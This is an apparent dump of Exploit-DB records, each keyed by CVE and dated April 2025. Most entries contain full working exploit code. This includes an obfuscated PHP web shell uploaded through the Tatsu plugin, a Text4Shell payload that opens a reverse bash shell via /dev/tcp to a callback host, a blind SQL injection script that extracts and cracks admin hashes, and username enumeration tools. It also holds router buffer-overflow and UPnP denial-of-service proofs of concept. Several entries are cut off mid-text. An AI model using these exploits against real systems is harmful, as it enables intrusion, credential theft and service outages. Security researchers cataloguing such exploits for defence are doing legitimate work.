CVE-2024-11972,2025-04-18,exploit db,"# Exploit Title: Hunk Companion Plugin 1.9.0 - Unauthenticated Plugin Installation # Date: 16 December, 2024 # Exploit Author: Jun Takemura # Author's GitHub: https://github.com/JunTakemura # Author's Blog: juntakemura.dev # Vendor Homepage: https://themehunk.com # Software Link: https://wordpress.org/plugins/hunk-companion/ # Version: Tested on Hunk Companion 1.8.8 # CVE: CVE-2024-11972 # Vulnerability Description: # Exploits a flaw in the Hunk Companion plugin's permission_callback for the # /wp-json/hc/v1/themehunk-import endpoint, allowing unauthenticated attackers # to install and activate arbitrary plugins from the WordPress.org repository. # Tested on: Ubuntu # Original vulnerability discovered by: Daniel Rodriguez # Usage: # 1. Update `target_url` below with the target WordPress site's URL. # 2. Update `plugin_name` with the slug of the plugin you want to install. # 3. Run: python3 exploit.py import requests from urllib.parse import urljoin # Update 'URL' with your target WordPress site URL, for example ""http://localhost/wordpress"" target_url = ""URL"" # Update 'NAME' with desired plugin's name (slug), for example ""wp-query-console"" plugin_name = ""NAME"" endpoint = ""/wp-json/hc/v1/themehunk-import"" url = urljoin(target_url, endpoint) payload = { ""params"": { ""plugin"": { plugin_name: ""Plugin Label"" ""allPlugins"": [ plugin_name: f""{plugin_name}/{plugin_name}.php"" ""themeSlug"": ""theme"", ""proThemePlugin"": ""plugin"", ""templateType"": ""free"", ""tmplFreePro"": ""theme"", ""wpUrl"": target_url headers = { ""User-Agent"": ""Mozilla/5.0 (Windows NT 6.1; WOW64)"", ""Content-Type"": ""application/json"" try: response = requests.post(url, json=payload, headers=headers, timeout=10) response.raise_for_status() # Raises an HTTPError if the response is not 2xx print(f""[+] Exploit sent successfully."") print(f""Response Status Code: {response.status_code}"") print(f""Response Body: {response.text}"") except requests.exceptions.RequestException as e: print(f""[-] Request failed: {e}"")"
CVE-2021-25094,2025-04-18,exploit db,"# Exploit Title:Tatsu 3.3.11 - Unauthenticated RCE # Date: 2025-04-16 # Exploit Author: Milad Karimi (Ex3ptionaL) # Contact: miladgrayhat@gmail.com # Zone-H: www.zone-h.org/archive/notifier=Ex3ptionaL # MiRROR-H: https://mirror-h.org/search/hacker/49626/ # Product: Tatsu wordpress plugin <= 3.3.11 # CVE: CVE-2021-25094 # URL: https://tatsubuilder.com/ import sys import requests import argparse import urllib3 import threading import time import base64 import queue import io import os import zipfile import string import random from datetime import datetime urllib3.disable_warnings() class HTTPCaller(): def __init__(self, url, headers, proxies, cmd): self.url = url self.headers = headers self.proxies = proxies self.cmd = cmd self.encodedCmd = base64.b64encode(cmd.encode(""utf8"")) self.zipname = None self.shellFilename = None if self.url[-1] == '/': self.url = self.url[:-1] if proxies: self.proxies = {""http"" : proxies, ""https"" : proxies} else: self.proxies = {} def generateZip(self, compressionLevel, technique, customShell, keep): buffer = io.BytesIO() with zipfile.ZipFile(buffer, ""w"", zipfile.ZIP_DEFLATED, False, compressionLevel) as zipFile: if technique == ""custom"" and customShell and os.path.isfile(customShell): with open(customShell) as f: shell = f.readlines() shell = ""\n"".join(shell) self.shellFilename = os.path.basename(customShell) if self.shellFilename[0] != ""."": self.shellFilename = ""."" + self.shellFilename zipFile.writestr(self.shellFilename, shell) elif technique == ""php"": # a lazy obfuscated shell, basic bypass Wordfence # i would change base64 encoding for something better shell = ""<?php "" shell += ""$f = \""lmeyst\"";"" shell += ""@$a= $f[4].$f[3].$f[4].$f[5].$f[2].$f[1];"" shell += ""@$words = array(base64_decode($_POST['text']));"" shell += ""$j=\""array\"".\""_\"".\""filter\"";"" shell += ""@$filtered_words = $j($words, $a);"" if not keep: shell += ""@unlink(__FILE__);"" self.shellFilename = ""."" + (''.join(random.choice(string.ascii_lowercase) for i in range(5))) + "".php"" zipFile.writestr(self.shellFilename, shell) elif technique.startswith(""htaccess""): # requires AllowOverride All in the apache config file shell = ""AddType application/x-httpd-php .png\n"" zipFile.writestr("".htaccess"", shell) shell = ""<?php "" shell += ""$f = \""lmeyst\"";"" shell += ""@$a= $f[4].$f[3].$f[4].$f[5].$f[2].$f[1];"" shell += ""@$words = array(base64_decode($_POST['text']));"" shell += ""$j=\""array\"".\""_\"".\""filter\"";"" shell += ""@$filtered_words = $j($words, $a);"" if not keep: shell += ""@unlink('.'+'h'+'t'+'a'+'cc'+'e'+'ss');"" shell += ""@unlink(__FILE__);"" self.shellFilename = ""."" + (''.join(random.choice(string.ascii_lowercase) for i in range(5))) + "".png"" zipFile.writestr(self.shellFilename, shell) else: print(""Error: unknow shell technique %s"" % technique) sys.exit(1) self.zipname = ''.join(random.choice(string.ascii_lowercase) for i in range(3)) self.zipFile = buffer def getShellUrl(self): return ""%s/wp-content/uploads/typehub/custom/%s/%s"" % (self.url, self.zipname, self.shellFilename) def executeCmd(self): return requests.post(url = self.getShellUrl(), data = {""text"": self.encodedCmd}, headers = self.headers, proxies = self.proxies, verify=False) def upload(self): url = ""%s/wp-admin/admin-ajax.php"" % self.url files = {""file"": (""%s.zip"" % self.zipname, self.zipFile.getvalue())} return requests.post(url = url, data = {""action"": ""add_custom_font""}, files = files, headers = self.headers, proxies = self.proxies, verify=False) def main(): description = ""|=== Tatsudo: pre-auth RCE exploit for Tatsu wordpress plugin <= 3.3.8\n"" description += ""|=== CVE-2021-25094 / Vincent MICHEL (@darkpills)"" print(description) print("""") parser = argparse.ArgumentParser() parser.add_argument(""url"", help=""Wordpress vulnerable URL (example: https://mywordpress.com/)"") parser.add_argument(""cmd"", help=""OS command to execute"") parser.add_argument('--technique', help=""Shell technique: php | htaccess | custom"", default=""php"") parser.add_argument('--customShell', help=""Provide a custom PHP shell file that will take a base64 cmd as $_POST['text'] input"") parser.add_argument('--keep', help=""Do not auto-destruct the uploaded PHP shell"", default=False, type=bool) parser.add_argument('--proxy', help=""Specify and use an HTTP proxy (example: http://localhost:8080)"") parser.add_argument('--compressionLevel', help=""Compression level of the zip file (0 to 9, default 9)"", default=9, type=int) args = parser.parse_args() # Use web browser-like header headers = { ""X-Requested-With"": ""XMLHttpRequest"", ""Origin"": args.url, ""Referer"": args.url, ""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36"", ""Accept"": ""*/*"", ""Accept-Language"": ""en-US,en;q=0.9"" caller = HTTPCaller(args.url, headers, args.proxy, args.cmd) print(""[+] Generating a zip with shell technique '%s'"" % args.technique) caller.generateZip(args.compressionLevel, args.technique, args.customShell, args.keep) print(""[+] Uploading zip archive to %s/wp-admin/admin-ajax.php?action=add_custom_font"" % (args.url)) r = caller.upload() if (r.status_code != 200 or not r.text.startswith('{""status"":""success""')): print(""[!] Got an unexpected HTTP response: %d with content:\n%s"" % (r.status_code, r.text)) print(""[!] Exploit failed!"") sys.exit(1) print(""[+] Upload OK"") print(""[+] Trigger shell at %s"" % caller.getShellUrl()) r = caller.executeCmd() if (r.status_code != 200): print(""[!] Got an unexpected HTTP response: %d with content:\n%s"" % (r.status_code, r.text)) print(""[!] Exploit failed!"") sys.exit(1) print(""[+] Exploit success!"") print(r.text) if args.keep: print(""[+] Call it with:"") print('curl -X POST -d""text=$(echo ""{0}"" | base64 -w0)"" {1}'.format(args.cmd, caller.getShellUrl())) else: print(""[+] Shell file has been auto-deleted but parent directory will remain on the webserver"") print(""[+] Job done"") if __name__ == '__main__': main()"
CVE-2022-42889,2025-04-18,exploit db,"# Exploit Title: Apache Commons Text 1.10.0 - Remote Code Execution (Text4Shell - POST-based) # Date: 2025-04-17 # Exploit Author: Arjun Chaudhary # Vendor Homepage: https://commons.apache.org/proper/commons-text/ # Software Link:https://repo1.maven.org/maven2/org/apache/commons/commons-text/ # Version: Apache Commons Text < 1.10.0 # Tested on: Ubuntu 20.04 (Docker container), Java 11+, Apache Commons Text 1.9 # CVE: CVE-2022-42889 # Type: Remote Code Execution (RCE) # Method: POST request, script interpolator # Notes: This exploit demonstrates an RCE vector via POST data, differing from common GET-based payloads. #!/usr/bin/env python3 import urllib.parse import http.client import sys def usage(): print(""Usage: python3 text4shell.py "") print(""Example: python3 text4shell.py 127.0.0.1 192.168.22.128 4444"") sys.exit(1) if len(sys.argv) != 4: usage() target_ip = sys.argv[1] callback_ip = sys.argv[2] callback_port = sys.argv[3] raw_payload = ( f""${{script:javascript:var p=java.lang.Runtime.getRuntime().exec("" f""['bash','-c','bash -c \\'exec bash -i >& /dev/tcp/{callback_ip}/{callback_port} 0>&1\\''])}}"" encoded_payload = urllib.parse.quote(raw_payload) path = f""/?data={encoded_payload}"" # modify the parameter according to your target print(f""[!] Remember to modify the parameter according to your target"") print(f""[+] Target: http://{target_ip}{path}"") print(f""[+] Payload (decoded): {raw_payload}"") conn = http.client.HTTPConnection(target_ip, 80) conn.request(""POST"", path, body="""", headers={ ""Host"": target_ip, ""Content-Type"": ""application/json"", ""Content-Length"": ""0"" response = conn.getresponse() print(f""[+] Response Status: {response.status}"") print(response.read().decode()) conn.close()"
CVE-2024-44541,2025-04-18,exploit db,"# Exploit Title: Inventio Lite 4 - SQL Injection Error Based SQLi in ""username"" parameter on ""/?action=processlogin."" # Date: 08/21/2024 # Exploit Author: pointedsec # Vendor Homepage: http://evilnapsis.com # Software Link: https://github.com/evilnapsis/inventio-lite # Version: < 4 # Tested on: Linux, Windows # CVE : CVE-2024-44541 # This scripts exploit this vulnerability, extracting the hashes from database and tries to decrypt it. # The passwords are hashed like this: $pass = sha1(md5($_POST['password'])); import requests import signal from pwn import * BASE_URL = ""http://192.168.1.51/inventio-lite/"" PWD_DIC_PATH = ""/usr/share/wordlists/rockyou.txt"" LOGIN_ACTION = BASE_URL + ""?action=processlogin"" # Handling Ctrl + C def def_handler(x,y): log.failure(""Quitting..."") exit(1) signal.signal(signal.SIGINT, def_handler) def is_vulnerable(): log.info(""Checking if target is vulnerable"") payload = { ""username"": ""\"") \"""", ""password"": ""\"") \"""" r = requests.post(LOGIN_ACTION, data=payload) if (r.status_code != 200 or ""Uncaught mysqli_sql_exception"" in r.text): return True else: return False def get_administrator_hash(username): prog_hash = log.progress(""Extracting Admin Password Hash"") replace_payload = ""\"") or username LIKE ' ' or email LIKE ' ' and password LIKE ' %' and is_admin=1 LIMIT 1-- -"".replace("" "", username) characters = ""abcdefghijklmnopqrstuvwxyz0123456789"" # SHA(MD5(PASSWORD)) so there are no symbols and no uppercases admin_hash = """" while True: found_char = False for char in characters: payload = { ""username"": replace_payload.replace("" "", admin_hash + char), ""password"": ""blablablbalbablalba123@"" try: r = requests.post(LOGIN_ACTION, data=payload) r.raise_for_status() except requests.RequestException as e: log.error(f""Request failed: {e}"") continue if "" "" in r.text: admin_hash += char prog_hash.status(""-> %s"" % admin_hash) found_char = True break if not found_char: break prog_hash.status(""Final Admin Hash: %s"" % admin_hash) return admin_hash def get_administrator_username(): prog_username = log.progress(""Extracting Username"") replace_payload = ""\"") or username like ' %' or email like ' %' and is_admin=1 LIMIT 1-- -"" characters = ""ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@."" username = """" while True: found_char = False for char in characters: payload = { ""username"": replace_payload.replace("" "", username + char), ""password"": ""blablablablbalbla123@"" r = requests.post(LOGIN_ACTION, data=payload) if "" "" in r.text: username += char prog_username.status(""-> %s"" % username) found_char = True break if not found_char: break return username def decrypt_password(admin_hash): # Encryption is SHA1(MD5(PWD)) with open(PWD_DIC_PATH) as password_file: for password in password_file: password = password.strip() md5_hash = hashlib.md5(password.encode()).hexdigest() sha1_hash = hashlib.sha1(md5_hash.encode()).hexdigest() if sha1_hash == admin_hash: return password log.error(""Password not found in the dictionary."") return None if __name__ == ""__main__"": # Check if target is vulnerable if not is_vulnerable(): log.failure(""Target not Vulnerable..."") exit(1) log.success(""Target Vulnerable!"") log.info(""Dumping Administrator username..."") admin_username = get_administrator_username() admin_hash = get_administrator_hash(admin_username) pwd = decrypt_password(admin_hash) log.success(f""Password Decrypted! -> {admin_username}:{pwd}"") log.info(""Try to Log In with that username, if that doesn't work, try with some uppercase/lowercase combinations"")"
CVE-2024-12483,2025-04-18,exploit db,"# Exploit Title: UJCMS 9.6.3 User Enumeration via IDOR # Exploit Author: Cyd Tseng # Date: 11 Dec 2024 # Category: Web application # Vendor Homepage: https://dromara.org/ # Software Link: https://github.com/dromara/ujcms # Version: UJCMS 9.6.3 # Tested on: Linux # CVE: CVE-2024-12483 # Advisory: https://github.com/cydtseng/Vulnerability-Research/blob/main/ujcms/IDOR-UsernameEnumeration.md An Insecure Direct Object Reference (IDOR) vulnerability was discovered in UJCMS version 9.6.3 that allows unauthenticated enumeration of usernames through the manipulation of the user id parameter in the /users/id endpoint. While the user IDs are generally large numbers (e.g., 69278363520885761), with the exception of the admin and anonymous account, unauthenticated attackers can still systematically discover usernames of existing accounts. import requests from bs4 import BeautifulSoup import time import re BASE_URL = 'http://localhost:8080/users/{}' # Modify as necessary! HEADERS = { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'Connection': 'keep-alive' def fetch_user_data(user_id): url = BASE_URL.format(user_id) try: response = requests.get(url, headers=HEADERS) if response.status_code == 200: soup = BeautifulSoup(response.content, 'html.parser') title = soup.title.string.strip() if title.lower() != '404': username = re.sub(r' - UJCMS演示站$', '', title) return user_id, username return None except requests.RequestException as e: print(f""Error fetching data for user ID {user_id}: {e}"") return None def user_id_generator(start, end): for user_id in range(start, end + 1): yield user_id def enumerate_users(start_id, end_id): for user_id in user_id_generator(start_id, end_id): user_data = fetch_user_data(user_id) if user_data: print(f""Valid user found: ID {user_data[0]} with username '{user_data[1]}'"") time.sleep(0.1) if __name__ == '__main__': start_id = int(input(""Enter the starting user ID: "")) end_id = int(input(""Enter the ending user ID: "")) print(f""Starting enumeration from ID {start_id} to {end_id}..."") enumerate_users(start_id, end_id)"
CVE-2024-11728,2025-04-18,exploit db,"# Exploit Title: KiviCare Clinic & Patient Management System (EHR) 3.6.4 - Unauthenticated SQL Injection SQL Injection # Google Dork: inurl:""/wp-content/plugins/kivicare-clinic-management-system/ # Date: 11/12/2024 # Exploit Author: Samet ""samogod"" Gözet # Vendor Homepage: wordpress.org # Software Link: https://wordpress.org/plugins/kivicare-clinic-management-system/ # Version: < 3.6.5 # Tested on: Ubuntu 22.04 # CVE : CVE-2024-11728 #!/usr/bin/env python3 CVE-2024-11728 - KiviCare WordPress Plugin Unauthenticated SQL Injection"
CVE-2024-12344,2025-04-17,exploit db,"* Exploit Title: TP-Link VN020 F3v(T) TT_V6.2.1021 - Buffer Overflow Memory Corruption * Date: 11/24/2024 * Exploit Author: Mohamed Maatallah * Vendor Homepage: https://www.tp-link.com * Version: TT_V6.2.1021 (VN020-F3v(T)) * Tested on: VN020-F3v(T) Router (Hardware Version 1.0) * CVE: CVE-2024-12344 * Category: Remote * Description: * A critical buffer overflow and memory corruption vulnerability was discovered in TP-Link VN020-F3v(T) router's FTP server implementation. The vulnerability stems from improper input validation of the USER command, allowing unauthenticated attackers to trigger various failure modes through payload size manipulation: * 1. 1100 bytes - Delayed crash (5-10 seconds) * 2. 1450 bytes - Immediate crash * 3. >1450 bytes - Undefined behavior/state corruption * Proof of Concept: (attached full c file) * Compilation Instructions (Visual Studio): * 1. Open Visual Studio * 2. Create a new C Console Application * 3. Add these additional dependencies to project settings: * - ws2_32.lib * - iphlpapi.lib * 4. Ensure Windows SDK is installed * 5. Set Platform Toolset to latest v143 or v142 * 6. Compile in Release or Debug mode * Disclaimer: * This proof of concept is for educational and research purposes only. * Unauthorized testing without explicit permission is unethical and illegal. #define _CRT_SECURE_NO_WARNINGS #include #include #include #include #include #include #include #include #pragma comment(lib, ""ws2_32.lib"") #pragma comment(lib, ""iphlpapi.lib"") #define DEST_IP ""192.168.1.1"" // IP of target FTP server #define DEST_PORT 21 // Standard FTP port #define PING_TIMEOUT_MS 1000 // Network timeout #define MAX_PING_RETRIES 5 // Connectivity check attempts #define CRASH_STRING_LENGTH 1450 // Exact number of 'A's triggering instantcrash #define TOTAL_PAYLOAD_LENGTH (CRASH_STRING_LENGTH + 5 + 2) // USER + As + \r\n typedef struct { HANDLE icmp_handle; IPAddr target_addr; LPVOID reply_buffer; DWORD reply_size; } ping_context_t; void log_msg(const char* prefix, const char* msg) { SYSTEMTIME st; GetLocalTime(&st); printf(""[%02d:%02d:%02d] %s %s\n"", st.wHour, st.wMinute, st.wSecond, prefix, msg); void hexdump(const char* desc, const void* addr, const int len) { int i; unsigned char buff[17]; const unsigned char* pc = (const unsigned char*)addr; if (desc != NULL) printf(""%s:\n"", desc); for (i = 0; i < len; i++) { if ((i % 16) == 0) { if (i != 0) printf("" %s\n"", buff); printf("" %04x "", i); printf("" %02x"", pc[i]); if ((pc[i] < 0x20) || (pc[i] > 0x7e)) buff[i % 16] = '.'; else buff[i % 16] = pc[i]; buff[(i % 16) + 1] = '\0'; while ((i % 16) != 0) { printf("" ""); i++; printf("" %s\n"", buff); BOOL check_connectivity(ping_context_t* ctx) { char send_buf[32] = { 0 }; return IcmpSendEcho(ctx->icmp_handle, ctx->target_addr, send_buf, sizeof(send_buf), NULL, ctx->reply_buffer, ctx->reply_size, PING_TIMEOUT_MS) > 0; char* generate_exact_crash_payload() { char* payload = (char*)malloc(TOTAL_PAYLOAD_LENGTH + 1); // +1 for null terminator if (!payload) { log_msg(""[-]"", ""Failed to allocate payload memory""); return NULL; strcpy(payload, ""USER ""); // 5 bytes memset(payload + 5, 'A', CRASH_STRING_LENGTH); // 1450 'A's memcpy(payload + 5 + CRASH_STRING_LENGTH, ""\r\n"", 2); // 2 bytes payload[TOTAL_PAYLOAD_LENGTH] = '\0'; char debug_msg[100]; snprintf(debug_msg, sizeof(debug_msg), ""Generated payload of length %d ('A's + 5 byte prefix + 2 byte suffix)"", TOTAL_PAYLOAD_LENGTH); log_msg(""[*]"", debug_msg); return payload; BOOL send_crash_payload(const char* target_ip, uint16_t target_port) { WSADATA wsa; SOCKET sock = INVALID_SOCKET; struct sockaddr_in server; char server_reply[2048]; int recv_size; ping_context_t ping_ctx = { 0 }; BOOL success = FALSE; if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) { log_msg(""[-]"", ""Winsock initialization failed""); return FALSE; ping_ctx.icmp_handle = IcmpCreateFile(); ping_ctx.reply_size = sizeof(ICMP_ECHO_REPLY) + 32; ping_ctx.reply_buffer = malloc(ping_ctx.reply_size); inet_pton(AF_INET, target_ip, &ping_ctx.target_addr); sock = socket(AF_INET, SOCK_STREAM, 0); if (sock == INVALID_SOCKET) { log_msg(""[-]"", ""Socket creation failed""); goto cleanup; server.sin_family = AF_INET; server.sin_port = htons(target_port); inet_pton(AF_INET, target_ip, &server.sin_addr); log_msg(""[*]"", ""Connecting to target FTP server...""); if (connect(sock, (struct sockaddr*)&server, sizeof(server)) < 0) { log_msg(""[-]"", ""Connection failed""); goto cleanup; log_msg(""[+]"", ""Connected successfully""); if (!check_connectivity(&ping_ctx)) { log_msg(""[-]"", ""No initial connectivity to target""); goto cleanup; if ((recv_size = recv(sock, server_reply, sizeof(server_reply) - 1, 0)) == SOCKET_ERROR) { log_msg(""[-]"", ""Failed to receive banner""); goto cleanup; server_reply[recv_size] = '\0'; log_msg(""[*]"", server_reply); char* payload = generate_exact_crash_payload(); if (!payload) { goto cleanup; log_msg(""[*]"", ""Sending crash payload...""); hexdump(""Payload hex dump (first 32 bytes)"", payload, 32); if (send(sock, payload, TOTAL_PAYLOAD_LENGTH, 0) < 0) { log_msg(""[-]"", ""Failed to send payload""); free(payload); goto cleanup; free(payload); log_msg(""[+]"", ""Payload sent successfully""); log_msg(""[*]"", ""Monitoring target status...""); Sleep(1000); // Wait a bit for crash to take effect int failed_pings = 0; for (int i = 0; i < MAX_PING_RETRIES; i++) { if (!check_connectivity(&ping_ctx)) { failed_pings++; if (failed_pings >= 3) { log_msg(""[+]"", ""Target crash confirmed!""); success = TRUE; goto cleanup; Sleep(500); log_msg(""[-]"", ""Target appears to still be responsive""); cleanup: if (sock != INVALID_SOCKET) { closesocket(sock); if (ping_ctx.icmp_handle != INVALID_HANDLE_VALUE) { IcmpCloseHandle(ping_ctx.icmp_handle); if (ping_ctx.reply_buffer) { free(ping_ctx.reply_buffer); WSACleanup(); return success; int main(void) { printf(""\nTP-Link VN020 FTP Memory Corruption"
CVE-2024-12342,2025-04-17,exploit db,"# Exploit Title: TP-Link VN020 F3v(T) TT_V6.2.1021 - Denial Of Service (DOS) # Date: 10/22/2024 # Exploit Author: Mohamed Maatallah # Vendor Homepage: https://www.tp-link.com # Version: TT_V6.2.1021 (VN020-F3v(T)) # Tested on: VN020-F3v(T) Router (Hardware Version 1.0) # CVE: CVE-2024-12342 Description: Two critical vulnerabilities discovered in TP-Link VN020-F3v(T) router's UPnP implementation, affecting the WANIPConnection service. The vulnerabilities allow unauthenticated attackers to cause denial of service and potential memory corruption through malformed SOAP requests. Proof of Concept 1 (Missing Parameters DoS): curl -v -X POST ""http://192.168.1.1:5431/control/WANIPConnection"" \ -H ""Content-Type: text/xml"" \ -H ""SOAPAction: \""urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\"""" \ -d ' hello ' Proof of Concept 2 (Memory Corruption): curl -v -X POST ""http://192.168.1.1:5431/control/WANIPConnection"" \ -H ""Content-Type: text/xml"" \ -H ""SOAPAction: \""urn:schemas-upnp-org:service:WANIPConnection:1#SetConnectionType\"""" \ -d ' '""$(perl -e 'print ""%x"" x 10000;')""' '"
CVE-2024-42640,2025-04-17,exploit db,# Exploit Title: Angular-Base64-Upload Library 0.1.21 - Unauthenticated Remote Code Execution (RCE) # Date: 10 October 2024 # Discovered by : Ravindu Wickramasinghe | rvz (@rvizx9) # Exploit Author: Ravindu Wickramasinghe | rvz (@rvizx9) # Vendor Homepage: https://www.npmjs.com/package/angular-base64-upload # Software Link: https://github.com/adonespitogo/angular-base64-upload # Version: prior to v0.1.21 # Tested on: Arch Linux # CVE : CVE-2024-42640 # Severity: Critical - 10.0 (CVSS 4.0) # Github Link : https://github.com/rvizx/CVE-2024-42640 # Blog Post : https://www.zyenra.com/blog/unauthenticated-rce-in-angular-base64-upload.html import re import subprocess import requests import sys import os import uuid import base64 import cmd from urllib.parse import urlparse def banner(): print(''' \033[2mCVE-2024-42640\033[0m - Unauthenticated RCE via Anuglar-Base64-Upload Library \033[2m
CVE-2024-44762,2025-04-17,exploit db,"# Exploit Title: Usermin 2.100 - Username Enumeration # Date: 10.02.2024 # Exploit Author: Kjesper # Vendor Homepage: https://www.webmin.com/usermin.html # Software Link: https://github.com/webmin/usermin # Version: <= 2.100 # Tested on: Kali Linux # CVE: CVE-2024-44762 # https://senscybersecurity.nl/cve-2024-44762-explained/ #!/usr/bin/python3 # -*- coding: utf-8 -*- # Usermin - Username Enumeration (Version 2.100) # Usage: UserEnumUsermin.py -u HOST -w WORDLIST_USERS # Example: UserEnumUsermin.py -u https://127.0.0.1:20000 -w users.txt import requests import json import requests import argparse import sys from urllib3.exceptions import InsecureRequestWarning requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning) parser = argparse.ArgumentParser() parser.add_argument(""-u"", ""--url"", help = ""use -u with the url to the host of usermin, EX: \""-u https://127.0.0.1:20000\"""") parser.add_argument(""-w"", ""--wordlist_users"", help = ""use -w with the username wordlist, EX: \""-w users.txt\"""") args = parser.parse_args() if len(sys.argv) != 5: print(""Please provide the -u for URL and -w for the wordlist containing the usernames"") print(""EX: python3 UsernameEnum.py -u https://127.0.0.1:20000 -w users.txt"") exit() usernameFile = open(args.wordlist_users, 'r') dataUsername = usernameFile.read() usernameFileIntoList = dataUsername.split(""\n"") usernameFile.close() for i in usernameFileIntoList: newHeaders = {'Content-type': 'application/x-www-form-urlencoded', 'Referer': '%s/password_change.cgi' % args.url} params = {'user':i, 'pam':'', 'expired':'2', 'old':'fakePassword', 'new1':'password', 'new2':'password'} response = requests.post('%s/password_change.cgi' % args.url, data=params, verify=False, headers=newHeaders) if ""Failed to change password: The current password is incorrect."" in response.text: print(""Possible user found with username: "" + i) if ""Failed to change password: Your login name was not found in the password file!"" not in response.text and ""Failed to change password: The current password is incorrect."" not in response.text: print(""Application is most likely not vulnerable and are therefore quitting."") exit() # comment out line 33-35 if you would still like to try username enumeration."
CVE-2024-48445,2025-04-17,exploit db,"# Exploit Title: compop.ca 3.5.3 - Arbitrary code Execution # Google Dork: Terms of Use inurl:compop.vip # Date: 22/12/2024 # Exploit Author: dmlino # Vendor Homepage: https://www.compop.ca/ # Version: 3.5.3 # CVE : CVE-2024-48445 The restaurant management system implements authentication using a Unix timestamp parameter (""ts"") in the URL. This implementation is vulnerable to manipulation as it relies solely on time-based validation without proper authentication mechanisms. Technical Details: The application uses a URL parameter ""ts"" which accepts a Unix timestamp value. Steps: 1. Find a vulnerable restaurant. 2. Get the current time in the UNIX format: Linux: $date +%s Windows Powershell: [int](Get-Date -UFormat %s -Millisecond 0) 3. Replace parameter in url with the new value"
CVE-2024-12955,2025-04-17,exploit db,#Exploit Title: Blood Bank & Donor Management System 2.4 - CSRF Improper Input Validation # Google Dork: N/A # Date: 2024-12-26 # Exploit Author: Kwangyun Keum # Vendor Homepage: https://phpgurukul.com/ # Software Link: https://phpgurukul.com/blood-bank-donor-management-system/ # Version: 2.4 # Tested on: Windows 10 / Kali Linux with Apache and MySQL # CVE: CVE-2024-12955 ## Description: Blood Bank & Donor Management System v2.4 suffers from a Cross-Site Request Forgery (CSRF) vulnerability due to the absence of CSRF tokens for critical functionalities such as logout. An attacker can craft a malicious iframe embedding the logout URL and trick a victim into clicking it. This results in the victim being logged out without their consent. ## Steps to Reproduce: 1. Deploy Blood Bank & Donor Management System v2.4. 2. Log in as any user. 3. Use the following
CVE-2024-48840,2025-04-17,exploit db,"# Exploit Title: ABB Cylon Aspect 3.08.02 (deployStart.php) Unauthenticated Command Execution # Vendor: ABB Ltd. # Product web page: https://www.global.abb # Affected version: NEXUS Series, MATRIX-2 Series, ASPECT-Enterprise, ASPECT-Studio Firmware: <=3.08.02 Summary: ASPECT is an award-winning scalable building energy management and control solution designed to allow users seamless access to their building data through standard building protocols including smart devices. Desc: The ABB Cylon Aspect BMS/BAS controller suffers from an unauthenticated shell command execution vulnerability through the deployStart.php script. This allows any user to trigger the execution of 'rundeploy.sh' script, which initializes the Java deployment server that sets various configurations, potentially causing unauthorized server initialization and performance issues. Tested on: GNU/Linux 3.15.10 (armv7l) GNU/Linux 3.10.0 (x86_64) GNU/Linux 2.6.32 (x86_64) Intel(R) Atom(TM) Processor E3930 @ 1.30GHz Intel(R) Xeon(R) Silver 4208 CPU @ 2.10GHz PHP/7.3.11 PHP/5.6.30 PHP/5.4.16 PHP/4.4.8 PHP/5.3.3 AspectFT Automation Application Server lighttpd/1.4.32 lighttpd/1.4.18 Apache/2.2.15 (CentOS) OpenJDK Runtime Environment (rhel-2.6.22.1.-x86_64) OpenJDK 64-Bit Server VM (build 24.261-b02, mixed mode) ErgoTech MIX Deployment Server 2.0.0 Vulnerability discovered by Gjoko 'LiquidWorm' Krstic @zeroscience Advisory ID: ZSL-2024-5891 Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2024-5891.php CVE ID: CVE-2024-48840 CVE URL: https://www.cve.org/CVERecord?id=CVE-2024-48840 21.04.2024 $ cat project P R O J E C T $ curl http://192.168.73.31/deployStart.php"
CVE-2021-33216,2025-04-16,exploit db,"# Exploit Title: CommScope Ruckus IoT Controller 1.7.1.0 - Undocumented Account # Date: 2021.05.26 # Exploit Author: korelogic # Vendor Homepage: https://www.commscope.com/globalassets/digizuite/917216-faq-security-advisory-id-20210525-v1-0.pdf # Affected Product: Ruckus IoT Controller # Version: 1.7.1.0 and earlier # Tested on: Linux # CVE : CVE-2021-33216,CVE-2019-1000018 KL-001-2021-007: CommScope Ruckus IoT Controller Undocumented Account Advisory ID: KL-001-2021-007 Publication Date: 2021.05.26 Publication URL: https://korelogic.com/Resources/Advisories/KL-001-2021-007.txt 1. Vulnerability Details Affected Vendor: CommScope Affected Product: Ruckus IoT Controller Affected Version: 1.7.1.0 and earlier Platform: Linux CWE Classification: CWE-798: Use of Hard-coded Credentials, CWE-912: Hidden Functionality CVE ID: CVE-2021-33216 2. Vulnerability Description An upgrade account is included in the IoT Controller OVA that provides the vendor undocumented access via Secure Copy (SCP). 3. Technical Description Once the OVA is imported into VirtualBox, a VMDK file is created. The VMDK file can be mounted and the directory structure and its contents can be perused. An authorized_keys file exists that allows an individual/organization possessing the SSH private key to access the virtual appliance using the 'vriotiotupgrade' account. The 'vriotiotupgrade' account is restricted to scp, per the rssh configuration. Additionally, it appears that the IoT Controller has rssh version 2.3.4 installed and in use. At the time of this advisory, there are at least three remote command injection vulnerabilities in this particular version of rssh: CVE-2019-3463, CVE-2019-3464 and CVE-2019-1000018. 4. Mitigation and Remediation Recommendation The vendor has released an updated firmware (1.8.0.0) which remediates the described vulnerability. Firmware and release notes are available at: https://www.commscope.com/globalassets/digizuite/917216-faq-security-advisory-id-20210525-v1-0.pdf 5. Credit This vulnerability was discovered by Jim Becher (@jimbecher) of KoreLogic, Inc. 6. Disclosure Timeline 2021.03.30 - KoreLogic submits vulnerability details to CommScope. 2021.03.30 - CommScope acknowledges receipt and the intention to investigate. 2021.04.06 - CommScope notifies KoreLogic that this issue, along with several others reported by KoreLogic, will require more than the standard 45 business day remediation timeline. 2021.04.06 - KoreLogic agrees to extend disclosure embargo if necessary. 2021.04.30 - CommScope informs KoreLogic that remediation for this vulnerability will be available inside of the standard 45 business day timeline. Requests KoreLogic acquire CVE number for this vulnerability. 2021.05.14 - 30 